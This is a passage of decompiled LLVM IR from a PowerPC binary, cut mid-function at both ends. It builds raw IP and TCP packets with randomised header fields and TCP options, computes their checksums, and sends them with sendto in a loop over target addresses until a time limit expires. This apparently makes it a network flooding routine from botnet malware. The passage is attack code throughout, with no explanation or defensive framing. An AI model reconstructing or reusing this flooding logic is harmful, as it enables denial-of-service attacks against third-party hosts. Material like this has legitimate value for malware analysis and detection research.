  store i32 %v4_100041f4, i32* %r0.global-to-local, align 4
  %v2_100041f8 = load i32, i32* %r29.global-to-local, align 4
  %v3_100041f8 = add i32 %v2_100041f8, 1
  %v4_100041f8 = inttoptr i32 %v3_100041f8 to i8*
  store i8 %v5_10003f90, i8* %v4_100041f8, align 1
  %v2_10004200 = load i32, i32* %r29.global-to-local, align 4
  %v3_10004200 = add i32 %v2_10004200, 8
  %v4_10004200 = inttoptr i32 %v3_10004200 to i8*
  store i8 %v5_10003fc8, i8* %v4_10004200, align 1
  %v0_10004204 = load i32, i32* %r29.global-to-local, align 4
  %v1_10004204 = add i32 %v0_10004204, 20
  store i32 %v1_10004204, i32* %r9.global-to-local, align 4
  %v0_10004208 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10004208, label %dec_label_pc_10004214, label %dec_label_pc_1000420c

dec_label_pc_1000420c:                            ; preds = %dec_label_pc_1000419c
  store i32 16384, i32* %r0.global-to-local, align 4
  %v3_10004210 = add i32 %v0_10004204, 6
  %v4_10004210 = inttoptr i32 %v3_10004210 to i16*
  store i16 16384, i16* %v4_10004210, align 2
  %v2_10004214.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10004214

dec_label_pc_10004214:                            ; preds = %dec_label_pc_1000419c, %dec_label_pc_1000420c
  %v2_10004214 = phi i32 [ %v0_10004204, %dec_label_pc_1000419c ], [ %v2_10004214.pre, %dec_label_pc_1000420c ]
  %v0_10004214 = load i32, i32* %r26.global-to-local, align 4
  %v1_10004214 = trunc i32 %v0_10004214 to i8
  %v3_10004214 = add i32 %v2_10004214, 9
  %v4_10004214 = inttoptr i32 %v3_10004214 to i8*
  store i8 %v1_10004214, i8* %v4_10004214, align 1
  %v0_10004218 = load i32, i32* %r15.global-to-local, align 4
  %v1_10004218 = trunc i32 %v0_10004218 to i16
  %v2_10004218 = load i32, i32* %r29.global-to-local, align 4
  %v3_10004218 = add i32 %v2_10004218, 20
  %v4_10004218 = inttoptr i32 %v3_10004218 to i16*
  store i16 %v1_10004218, i16* %v4_10004218, align 2
  store i32 %v6_100040f0, i32* %r0.global-to-local, align 4
  %v0_10004220 = load i32, i32* %r16.global-to-local, align 4
  %v1_10004220 = trunc i32 %v0_10004220 to i16
  %v2_10004220 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004220 = add i32 %v2_10004220, 2
  %v4_10004220 = inttoptr i32 %v3_10004220 to i16*
  store i16 %v1_10004220, i16* %v4_10004220, align 2
  %v0_10004224 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004224 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004224 = add i32 %v1_10004224, 12
  %v3_10004224 = inttoptr i32 %v2_10004224 to i32*
  store i32 %v0_10004224, i32* %v3_10004224, align 4
  %v0_10004228 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004228 = add i32 %v0_10004228, 16
  %v2_10004228 = inttoptr i32 %v1_10004228 to i32*
  %v3_10004228 = load i32, i32* %v2_10004228, align 4
  %v1_1000422c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000422c = add i32 %v1_1000422c, 16
  %v3_1000422c = inttoptr i32 %v2_1000422c to i32*
  store i32 %v3_10004228, i32* %v3_1000422c, align 4
  store i32 %v5_1000402c, i32* %r0.global-to-local, align 4
  %v1_10004234 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004234 = add i32 %v1_10004234, 4
  %v3_10004234 = inttoptr i32 %v2_10004234 to i32*
  store i32 %v5_1000402c, i32* %v3_10004234, align 4
  %v0_10004238 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004238 = add i32 %v0_10004238, 12
  %v2_10004238 = inttoptr i32 %v1_10004238 to i32*
  %v3_10004238 = load i32, i32* %v2_10004238, align 4
  store i32 %v3_10004238, i32* %r0.global-to-local, align 4
  %v2_1000423c = call i32 @__asm_rlwimi(i32 10, i32 28, i32 0, i32 3)
  store i32 %v2_1000423c, i32* %r0.global-to-local, align 4
  %v1_10004240 = call i32 @__asm_rlwimi(i32 %v1_10004194, i32 21, i32 10, i32 10)
  store i32 %v1_10004240, i32* %r0.global-to-local, align 4
  %v1_10004244 = call i32 @__asm_rlwimi(i32 %v1_1000417c, i32 20, i32 11, i32 11)
  store i32 %v1_10004244, i32* %r0.global-to-local, align 4
  %v1_10004248 = call i32 @__asm_rlwimi(i32 %v1_10004180, i32 19, i32 12, i32 12)
  store i32 %v1_10004248, i32* %r0.global-to-local, align 4
  %v1_1000424c = call i32 @__asm_rlwimi(i32 %v1_10004188, i32 18, i32 13, i32 13)
  store i32 %v1_1000424c, i32* %r0.global-to-local, align 4
  %v1_10004250 = call i32 @__asm_rlwimi(i32 %v1_1000418c, i32 17, i32 14, i32 14)
  store i32 %v1_10004250, i32* %r0.global-to-local, align 4
  %v1_10004254 = call i32 @__asm_rlwimi(i32 %v1_10004190, i32 16, i32 15, i32 15)
  store i32 %v1_10004254, i32* %r0.global-to-local, align 4
  %v1_10004258 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004258 = add i32 %v1_10004258, 12
  %v3_10004258 = inttoptr i32 %v2_10004258 to i32*
  store i32 %v1_10004254, i32* %v3_10004258, align 4
  %v0_1000425c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000425c = trunc i32 %v0_1000425c to i8
  %v2_1000425c = load i32, i32* %r29.global-to-local, align 4
  %v3_1000425c = add i32 %v2_1000425c, 40
  %v4_1000425c = inttoptr i32 %v3_1000425c to i8*
  store i8 %v1_1000425c, i8* %v4_1000425c, align 1
  %v3_10004260 = load i32, i32* %r29.global-to-local, align 4
  %v4_10004260 = add i32 %v3_10004260, 41
  %v5_10004260 = inttoptr i32 %v4_10004260 to i8*
  store i8 4, i8* %v5_10004260, align 1
  %v0_10004264 = call i32 @rand_next()
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000426c = urem i32 %v0_10004264, 16
  store i32 %v1_1000426c, i32* %r3.global-to-local, align 4
  %v2_10004270 = load i32, i32* %r29.global-to-local, align 4
  %v3_10004270 = add i32 %v2_10004270, 46
  %v4_10004270 = inttoptr i32 %v3_10004270 to i8*
  store i8 8, i8* %v4_10004270, align 1
  %v0_10004274 = load i32, i32* %r3.global-to-local, align 4
  %v1_10004274 = add i32 %v0_10004274, 1400
  store i32 %v1_10004274, i32* %r3.global-to-local, align 4
  %v3_10004278 = load i32, i32* %r29.global-to-local, align 4
  %v4_10004278 = add i32 %v3_10004278, 44
  %v5_10004278 = inttoptr i32 %v4_10004278 to i8*
  store i8 4, i8* %v5_10004278, align 1
  %v0_1000427c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000427c = trunc i32 %v0_1000427c to i16
  %v2_1000427c = load i32, i32* %r29.global-to-local, align 4
  %v3_1000427c = add i32 %v2_1000427c, 42
  %v4_1000427c = inttoptr i32 %v3_1000427c to i16*
  store i16 %v1_1000427c, i16* %v4_1000427c, align 2
  %v0_10004280 = load i32, i32* %r28.global-to-local, align 4
  %v1_10004280 = trunc i32 %v0_10004280 to i8
  %v2_10004280 = load i32, i32* %r29.global-to-local, align 4
  %v3_10004280 = add i32 %v2_10004280, 45
  %v4_10004280 = inttoptr i32 %v3_10004280 to i8*
  store i8 %v1_10004280, i8* %v4_10004280, align 1
  %v3_10004284 = load i32, i32* %r29.global-to-local, align 4
  %v4_10004284 = add i32 %v3_10004284, 47
  %v5_10004284 = inttoptr i32 %v4_10004284 to i8*
  store i8 10, i8* %v5_10004284, align 1
  %v0_10004288 = call i32 @rand_next()
  store i32 %v0_10004288, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10004298 = load i32, i32* %r26.global-to-local, align 4
  %v1_10004298 = trunc i32 %v0_10004298 to i8
  %v2_10004298 = load i32, i32* %r29.global-to-local, align 4
  %v3_10004298 = add i32 %v2_10004298, 59
  %v4_10004298 = inttoptr i32 %v3_10004298 to i8*
  store i8 %v1_10004298, i8* %v4_10004298, align 1
  %v1_1000429c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000429c = add i32 %v1_1000429c, 48
  %v3_1000429c = inttoptr i32 %v2_1000429c to i32*
  store i32 %v0_10004288, i32* %v3_1000429c, align 4
  %v0_100042a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100042a0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100042a0 = add i32 %v1_100042a0, 52
  %v3_100042a0 = inttoptr i32 %v2_100042a0 to i32*
  store i32 %v0_100042a0, i32* %v3_100042a0, align 4
  %v0_100042a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100042a4 = trunc i32 %v0_100042a4 to i8
  %v2_100042a4 = load i32, i32* %r29.global-to-local, align 4
  %v3_100042a4 = add i32 %v2_100042a4, 56
  %v4_100042a4 = inttoptr i32 %v3_100042a4 to i8*
  store i8 %v1_100042a4, i8* %v4_100042a4, align 1
  %v0_100042a8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100042a8 = trunc i32 %v0_100042a8 to i8
  %v2_100042a8 = load i32, i32* %r29.global-to-local, align 4
  %v3_100042a8 = add i32 %v2_100042a8, 58
  %v4_100042a8 = inttoptr i32 %v3_100042a8 to i8*
  store i8 %v1_100042a8, i8* %v4_100042a8, align 1
  %v0_100042ac = load i32, i32* %r11.global-to-local, align 4
  %v1_100042ac = trunc i32 %v0_100042ac to i8
  %v2_100042ac = load i32, i32* %r29.global-to-local, align 4
  %v3_100042ac = add i32 %v2_100042ac, 57
  %v4_100042ac = inttoptr i32 %v3_100042ac to i8*
  store i8 %v1_100042ac, i8* %v4_100042ac, align 1
  %v3_100042b0 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_100042b0, i32* %r9.global-to-local, align 4
  %v1_100042b4 = add i32 %v3_100042b0, 1
  store i32 %v1_100042b4, i32* %r29.global-to-local, align 4
  %v1_100042b8 = load i32, i32* @r21, align 4
  %v2_100042b8 = icmp slt i32 %v1_100042b4, %v1_100042b8
  %v4_100042b8 = icmp eq i32 %v1_100042b4, %v1_100042b8
  store i1 %v4_100042b8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_100042b4, i32* %stack_var_-136, align 4
  br i1 %v2_100042b8, label %dec_label_pc_1000419c, label %dec_label_pc_100042c4.loopexit

dec_label_pc_100042c4.loopexit:                   ; preds = %dec_label_pc_10004214
  %v0_100042d8.pre = load i32, i32* %r15.global-to-local, align 4
  %v0_100042dc.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_100042c4

dec_label_pc_100042c4:                            ; preds = %dec_label_pc_100042c4.loopexit, %dec_label_pc_10004148
  %v0_100042dc = phi i32 [ %v0_100042dc.pre, %dec_label_pc_100042c4.loopexit ], [ %v1_10004164, %dec_label_pc_10004148 ]
  %v0_100042d8 = phi i32 [ %v0_100042d8.pre, %dec_label_pc_100042c4.loopexit ], [ %v1_10004160, %dec_label_pc_10004148 ]
  store i32 65535, i32* %r0.global-to-local, align 4
  %v4_100042d0 = icmp eq i32 %v5_10004044, 65535
  store i1 %v4_100042d0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v6_100040f0, i32* %r9.global-to-local, align 4
  %v4_100042d8 = icmp eq i32 %v0_100042d8, 65535
  store i1 %v4_100042d8, i1* %cr2_eq.global-to-local, align 1
  %v4_100042dc = icmp eq i32 %v0_100042dc, 65535
  store i1 %v4_100042dc, i1* %cr3_eq.global-to-local, align 1
  %v0_100042e0 = call i32 @__asm_mfcr()
  store i32 %v0_100042e0, i32* %r3.global-to-local, align 4
  %v1_100042e4 = mul i32 %v0_100042e0, 268435456
  store i32 %v1_100042e4, i32* %r24.global-to-local, align 4
  %v0_100042e8 = load i32, i32* %r9.global-to-local, align 4
  %v3_100042e8 = icmp eq i32 %v0_100042e8, -1
  store i1 %v3_100042e8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10004168, i32* %r9.global-to-local, align 4
  %v0_100042f0 = call i32 @__asm_mfcr()
  store i32 %v0_100042f0, i32* %r3.global-to-local, align 4
  %v1_100042f4 = mul i32 %v0_100042f0, 268435456
  store i32 %v1_100042f4, i32* @r25, align 4
  %v0_100042f8 = load i32, i32* %r9.global-to-local, align 4
  %v3_100042f8 = icmp eq i32 %v0_100042f8, 0
  store i1 %v3_100042f8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v5_1000402c, i32* %r9.global-to-local, align 4
  %v0_10004300 = call i32 @__asm_mfcr()
  store i32 %v0_10004300, i32* %r3.global-to-local, align 4
  %v1_10004304 = mul i32 %v0_10004300, 268435456
  store i32 %v1_10004304, i32* @r26, align 4
  %v0_10004308 = load i32, i32* %r14.global-to-local, align 4
  %v1_10004308 = load i32, i32* %r0.global-to-local, align 4
  %v4_10004308 = icmp eq i32 %v0_10004308, %v1_10004308
  store i1 %v4_10004308, i1* %cr7_eq.global-to-local, align 1
  %v0_1000430c = load i32, i32* %r9.global-to-local, align 4
  %v4_1000430c = icmp eq i32 %v0_1000430c, %v1_10004308
  store i1 %v4_1000430c, i1* %cr4_eq.global-to-local, align 1
  %v0_10004310 = call i32 @__asm_mfcr()
  store i32 %v0_10004310, i32* %r3.global-to-local, align 4
  %v1_10004314 = mul i32 %v0_10004310, 268435456
  store i32 %v1_10004314, i32* @r30, align 4
  %v2_10004324 = urem i32 %v0_10004158, 16
  %v1_1000432c = mul nuw i32 %v2_10004324, 268435456
  br label %dec_label_pc_10004318

dec_label_pc_10004318:                            ; preds = %dec_label_pc_10004418, %dec_label_pc_100042c4
  store i32 0, i32* %stack_var_-136, align 4
  store i32 %v2_10004324, i32* %r0.global-to-local, align 4
  %v1_10004328 = call %0 @__asm_mtcrf(i32 1, i32 %v2_10004324)
  store i32 %v1_1000432c, i32* %r0.global-to-local, align 4
  %v0_10004330 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004330, label %dec_label_pc_10004418, label %dec_label_pc_10004334

dec_label_pc_10004334:                            ; preds = %dec_label_pc_10004318
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004338

dec_label_pc_10004338:                            ; preds = %dec_label_pc_100043a4, %dec_label_pc_10004334
  %v0_10004338 = phi i32 [ %v1_10004408, %dec_label_pc_100043a4 ], [ 0, %dec_label_pc_10004334 ]
  %v1_10004338 = mul i32 %v0_10004338, 24
  store i32 %v1_10004338, i32* %r0.global-to-local, align 4
  %v1_1000433c = mul i32 %v0_10004338, 4
  store i32 %v1_1000433c, i32* %r11.global-to-local, align 4
  %v1_10004340 = load i32, i32* @r22, align 4
  %v2_10004340 = add i32 %v1_10004340, %v1_1000433c
  %v3_10004340 = inttoptr i32 %v2_10004340 to i32*
  %v4_10004340 = load i32, i32* %v3_10004340, align 4
  store i32 %v4_10004340, i32* %r28.global-to-local, align 4
  %v1_10004344 = load i32, i32* @r31, align 4
  %v2_10004344 = add i32 %v1_10004344, %v1_10004338
  %v1_10004348 = add i32 %v2_10004344, 20
  %v2_10004348 = inttoptr i32 %v1_10004348 to i8*
  %v3_10004348 = load i8, i8* %v2_10004348, align 1
  %v4_10004348 = zext i8 %v3_10004348 to i32
  store i32 %v4_10004348, i32* %r9.global-to-local, align 4
  %v1_1000434c = add i32 %v4_10004340, 20
  store i32 %v1_1000434c, i32* %r27.global-to-local, align 4
  %v3_10004350 = icmp eq i8 %v3_10004348, 31
  store i1 %v3_10004350, i1* %cr7_eq.global-to-local, align 1
  %tmp38 = icmp ult i8 %v3_10004348, 32
  br i1 %tmp38, label %dec_label_pc_100044f4, label %dec_label_pc_10004358

dec_label_pc_10004358:                            ; preds = %dec_label_pc_10004338
  %v0_10004358 = load i32, i32* @r25, align 4
  %v1_10004358 = mul i32 %v0_10004358, 16
  %v2_10004358 = udiv i32 %v0_10004358, 268435456
  %v3_10004358 = or i32 %v2_10004358, %v1_10004358
  store i32 %v3_10004358, i32* %r25.global-to-local, align 4
  %v1_1000435c = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004358)
  %v1_10004360 = mul nuw i32 %v2_10004358, 268435456
  %v2_10004360 = urem i32 %v0_10004358, 268435456
  %v3_10004360 = or i32 %v1_10004360, %v2_10004360
  store i32 %v3_10004360, i32* %r25.global-to-local, align 4
  %v0_10004364 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004364, label %dec_label_pc_10004528, label %dec_label_pc_10004368

dec_label_pc_10004368:                            ; preds = %dec_label_pc_100044f4, %dec_label_pc_10004358, %dec_label_pc_10004528
  %v0_10004368 = load i32, i32* @r30, align 4
  %v1_10004368 = mul i32 %v0_10004368, 16
  %v2_10004368 = udiv i32 %v0_10004368, 268435456
  %v3_10004368 = or i32 %v2_10004368, %v1_10004368
  store i32 %v3_10004368, i32* %r30.global-to-local, align 4
  %v1_1000436c = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004368)
  %v1_10004370 = mul nuw i32 %v2_10004368, 268435456
  %v2_10004370 = urem i32 %v0_10004368, 268435456
  %v3_10004370 = or i32 %v1_10004370, %v2_10004370
  store i32 %v3_10004370, i32* %r30.global-to-local, align 4
  %v0_10004374 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004374, label %dec_label_pc_100044e4, label %dec_label_pc_10004378

dec_label_pc_10004378:                            ; preds = %dec_label_pc_10004368
  %v0_10004378 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10004378, label %dec_label_pc_100044d4, label %dec_label_pc_1000437c

dec_label_pc_1000437c:                            ; preds = %dec_label_pc_100044e4, %dec_label_pc_10004378
  %v0_1000437c = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_1000437c, label %dec_label_pc_1000448c, label %dec_label_pc_10004380

dec_label_pc_10004380:                            ; preds = %dec_label_pc_100044d4, %dec_label_pc_1000437c
  %v0_10004380 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10004380, label %dec_label_pc_10004498, label %dec_label_pc_10004384

dec_label_pc_10004384:                            ; preds = %dec_label_pc_1000448c, %dec_label_pc_10004380
  %v0_10004384 = load i32, i32* %r24.global-to-local, align 4
  %v1_10004384 = mul i32 %v0_10004384, 16
  %v2_10004384 = udiv i32 %v0_10004384, 268435456
  %v3_10004384 = or i32 %v2_10004384, %v1_10004384
  store i32 %v3_10004384, i32* %r24.global-to-local, align 4
  %v1_10004388 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004384)
  %v1_1000438c = mul nuw i32 %v2_10004384, 268435456
  %v2_1000438c = urem i32 %v0_10004384, 268435456
  %v3_1000438c = or i32 %v1_1000438c, %v2_1000438c
  store i32 %v3_1000438c, i32* %r24.global-to-local, align 4
  %v0_10004390 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004390, label %dec_label_pc_100044b0, label %dec_label_pc_10004394

dec_label_pc_10004394:                            ; preds = %dec_label_pc_10004498, %dec_label_pc_10004384
  %v0_10004394 = load i32, i32* @r26, align 4
  %v1_10004394 = mul i32 %v0_10004394, 16
  %v2_10004394 = udiv i32 %v0_10004394, 268435456
  %v3_10004394 = or i32 %v2_10004394, %v1_10004394
  store i32 %v3_10004394, i32* %r26.global-to-local, align 4
  %v1_10004398 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10004394)
  %v1_1000439c = mul nuw i32 %v2_10004394, 268435456
  %v2_1000439c = urem i32 %v0_10004394, 268435456
  %v3_1000439c = or i32 %v1_1000439c, %v2_1000439c
  store i32 %v3_1000439c, i32* %r26.global-to-local, align 4
  %v0_100043a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100043a0, label %dec_label_pc_100043a4, label %dec_label_pc_100044c8

dec_label_pc_100043a4:                            ; preds = %dec_label_pc_10004394, %dec_label_pc_100044b0, %dec_label_pc_100044c8
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_100043ac = load i32, i32* %r28.global-to-local, align 4
  %v3_100043ac = add i32 %v2_100043ac, 10
  %v4_100043ac = inttoptr i32 %v3_100043ac to i16*
  store i16 0, i16* %v4_100043ac, align 2
  %v0_100043b0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100043b0, i32* @r3, align 4
  %v2_100043b4 = call i32 @checksum_generic(i32 %v0_100043b0, i32 20)
  %v3_100043b4 = trunc i32 %v2_100043b4 to i16
  %v0_100043b8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100043b8, i32* @r4, align 4
  %v4_100043bc = add i32 %v0_100043b0, 10
  %v5_100043bc = inttoptr i32 %v4_100043bc to i16*
  store i16 %v3_100043b4, i16* %v5_100043bc, align 2
  %v0_100043c4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100043c4 = trunc i32 %v0_100043c4 to i16
  %v2_100043c4 = load i32, i32* %r27.global-to-local, align 4
  %v3_100043c4 = add i32 %v2_100043c4, 16
  %v4_100043c4 = inttoptr i32 %v3_100043c4 to i16*
  store i16 %v1_100043c4, i16* %v4_100043c4, align 2
  %v0_100043cc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100043cc, i32* %r3.global-to-local, align 4
  %v4_100043d0 = call i32 @checksum_tcpudp(i32 %v0_100043cc, i32 %v0_100043b8, i32 40, i32 40)
  %v5_100043d0 = trunc i32 %v4_100043d0 to i16
  store i32 %v4_100043d0, i32* %r3.global-to-local, align 4
  %v3_100043d4 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_100043d4, i32* %r7.global-to-local, align 4
  %v0_100043d8 = load i32, i32* %r27.global-to-local, align 4
  %v1_100043d8 = add i32 %v0_100043d8, 2
  %v2_100043d8 = inttoptr i32 %v1_100043d8 to i16*
  %v3_100043d8 = load i16, i16* %v2_100043d8, align 2
  %v4_100043d8 = zext i16 %v3_100043d8 to i32
  store i32 %v4_100043d8, i32* %r0.global-to-local, align 4
  %v0_100043dc = load i32, i32* %r28.global-to-local, align 4
  %v1_100043e0 = mul i32 %v3_100043d4, 24
  store i32 %v1_100043e0, i32* %r7.global-to-local, align 4
  %v4_100043e4 = add i32 %v0_100043d8, 16
  %v5_100043e4 = inttoptr i32 %v4_100043e4 to i16*
  store i16 %v5_100043d0, i16* %v5_100043e4, align 2
  %v0_100043ec = load i32, i32* @r23, align 4
  store i32 %v0_100043ec, i32* %r3.global-to-local, align 4
  %v0_100043f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_100043f0 = load i32, i32* @r31, align 4
  %v2_100043f0 = add i32 %v1_100043f0, %v0_100043f0
  store i32 %v2_100043f0, i32* %r7.global-to-local, align 4
  %v0_100043f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100043f8 = trunc i32 %v0_100043f8 to i16
  %v3_100043f8 = add i32 %v2_100043f0, 2
  %v4_100043f8 = inttoptr i32 %v3_100043f8 to i16*
  store i16 %v1_100043f8, i16* %v4_100043f8, align 2
  store i32 268452868, i32* @lr, align 4
  %v6_10004400 = call i32 @__libc_sendto(i32 %v0_100043ec, i32 %v0_100043dc, i32 60, i32 16384, i32 %v2_100043f0, i32 16)
  store i32 %v6_10004400, i32* %r3.global-to-local, align 4
  %v3_10004404 = load i32, i32* %stack_var_-136, align 4
  %v1_10004408 = add i32 %v3_10004404, 1
  store i32 %v1_10004408, i32* %r9.global-to-local, align 4
  %v1_1000440c = load i32, i32* @r21, align 4
  %v2_1000440c = icmp slt i32 %v1_10004408, %v1_1000440c
  %v4_1000440c = icmp eq i32 %v1_10004408, %v1_1000440c
  store i1 %v4_1000440c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10004408, i32* %stack_var_-136, align 4
  br i1 %v2_1000440c, label %dec_label_pc_10004338, label %dec_label_pc_10004418

dec_label_pc_10004418:                            ; preds = %dec_label_pc_100043a4, %dec_label_pc_10004318
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1000441c = call i32 @__GI_time()
  store i32 %v0_1000441c, i32* %r3.global-to-local, align 4
  store i32 %v2_10004104, i32* %r0.global-to-local, align 4
  %v2_10004424 = icmp slt i32 %v2_10004104, %v0_1000441c
  %v4_10004424 = icmp eq i32 %v2_10004104, %v0_1000441c
  store i1 %v4_10004424, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10004424, label %dec_label_pc_1000442c, label %dec_label_pc_10004318

dec_label_pc_1000442c:                            ; preds = %dec_label_pc_10004418, %entry, %dec_label_pc_10004534
  store i32 %v0_10003f14, i32* %r0.global-to-local, align 4
  %v1_10004440 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10003ef0)
  store i32 %v0_10003f3c, i32* %r25.global-to-local, align 4
  store i32 %v0_10003f40, i32* %r26.global-to-local, align 4
  store i32 %v0_10003f04, i32* %r27.global-to-local, align 4
  store i32 %v0_10003f44, i32* %r28.global-to-local, align 4
  store i32 %v0_10003f4c, i32* %r29.global-to-local, align 4
  store i32 %v0_10003f54, i32* %r30.global-to-local, align 4
  %v0_10004488 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004488

dec_label_pc_1000448c:                            ; preds = %dec_label_pc_100044d4, %dec_label_pc_1000437c
  %v0_1000448c = call i32 @rand_next()
  %v1_1000448c = trunc i32 %v0_1000448c to i16
  store i32 %v0_1000448c, i32* %r3.global-to-local, align 4
  %v3_10004490 = load i32, i32* %r27.global-to-local, align 4
  %v4_10004490 = add i32 %v3_10004490, 2
  %v5_10004490 = inttoptr i32 %v4_10004490 to i16*
  store i16 %v1_1000448c, i16* %v5_10004490, align 2
  %v0_10004494 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10004494, label %dec_label_pc_10004498, label %dec_label_pc_10004384

dec_label_pc_10004498:                            ; preds = %dec_label_pc_1000448c, %dec_label_pc_10004380
  %v0_10004498 = call i32 @rand_next()
  store i32 %v0_10004498, i32* %r3.global-to-local, align 4
  %v0_1000449c = load i32, i32* %r24.global-to-local, align 4
  %v1_1000449c = mul i32 %v0_1000449c, 16
  %v2_1000449c = udiv i32 %v0_1000449c, 268435456
  %v3_1000449c = or i32 %v2_1000449c, %v1_1000449c
  store i32 %v3_1000449c, i32* %r24.global-to-local, align 4
  %v1_100044a0 = call %0 @__asm_mtcrf(i32 1, i32 %v3_1000449c)
  %v1_100044a4 = mul nuw i32 %v2_1000449c, 268435456
  %v2_100044a4 = urem i32 %v0_1000449c, 268435456
  %v3_100044a4 = or i32 %v1_100044a4, %v2_100044a4
  store i32 %v3_100044a4, i32* %r24.global-to-local, align 4
  %v1_100044a8 = load i32, i32* %r27.global-to-local, align 4
  %v2_100044a8 = add i32 %v1_100044a8, 4
  %v3_100044a8 = inttoptr i32 %v2_100044a8 to i32*
  store i32 %v0_10004498, i32* %v3_100044a8, align 4
  %v0_100044ac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100044ac, label %dec_label_pc_100044b0, label %dec_label_pc_10004394

dec_label_pc_100044b0:                            ; preds = %dec_label_pc_10004498, %dec_label_pc_10004384
  %v0_100044b0 = call i32 @rand_next()
  store i32 %v0_100044b0, i32* %r3.global-to-local, align 4
  %v0_100044b4 = load i32, i32* @r26, align 4
  %v1_100044b4 = mul i32 %v0_100044b4, 16
  %v2_100044b4 = udiv i32 %v0_100044b4, 268435456
  %v3_100044b4 = or i32 %v2_100044b4, %v1_100044b4
  store i32 %v3_100044b4, i32* %r26.global-to-local, align 4
  %v1_100044b8 = call %0 @__asm_mtcrf(i32 1, i32 %v3_100044b4)
  %v1_100044bc = mul nuw i32 %v2_100044b4, 268435456
  %v2_100044bc = urem i32 %v0_100044b4, 268435456
  %v3_100044bc = or i32 %v1_100044bc, %v2_100044bc
  store i32 %v3_100044bc, i32* %r26.global-to-local, align 4
  %v1_100044c0 = load i32, i32* %r27.global-to-local, align 4
  %v2_100044c0 = add i32 %v1_100044c0, 8
  %v3_100044c0 = inttoptr i32 %v2_100044c0 to i32*
  store i32 %v0_100044b0, i32* %v3_100044c0, align 4
  %v0_100044c4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100044c4, label %dec_label_pc_100043a4, label %dec_label_pc_100044c8

dec_label_pc_100044c8:                            ; preds = %dec_label_pc_10004394, %dec_label_pc_100044b0
  %v0_100044c8 = call i32 @rand_next()
  %v1_100044c8 = trunc i32 %v0_100044c8 to i16
  store i32 %v0_100044c8, i32* %r3.global-to-local, align 4
  %v3_100044cc = load i32, i32* %r27.global-to-local, align 4
  %v4_100044cc = add i32 %v3_100044cc, 18
  %v5_100044cc = inttoptr i32 %v4_100044cc to i16*
  store i16 %v1_100044c8, i16* %v5_100044cc, align 2
  br label %dec_label_pc_100043a4

dec_label_pc_100044d4:                            ; preds = %dec_label_pc_100044e4, %dec_label_pc_10004378
  %v0_100044d4 = call i32 @rand_next()
  %v1_100044d4 = trunc i32 %v0_100044d4 to i16
  store i32 %v0_100044d4, i32* %r3.global-to-local, align 4
  %v3_100044d8 = load i32, i32* %r28.global-to-local, align 4
  %v4_100044d8 = add i32 %v3_100044d8, 20
  %v5_100044d8 = inttoptr i32 %v4_100044d8 to i16*
  store i16 %v1_100044d4, i16* %v5_100044d8, align 2
  %v0_100044dc = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_100044dc, label %dec_label_pc_1000448c, label %dec_label_pc_10004380

dec_label_pc_100044e4:                            ; preds = %dec_label_pc_10004368
  %v0_100044e4 = call i32 @rand_next()
  %v1_100044e4 = trunc i32 %v0_100044e4 to i16
  store i32 %v0_100044e4, i32* %r3.global-to-local, align 4
  %v3_100044e8 = load i32, i32* %r28.global-to-local, align 4
  %v4_100044e8 = add i32 %v3_100044e8, 4
  %v5_100044e8 = inttoptr i32 %v4_100044e8 to i16*
  store i16 %v1_100044e4, i16* %v5_100044e8, align 2
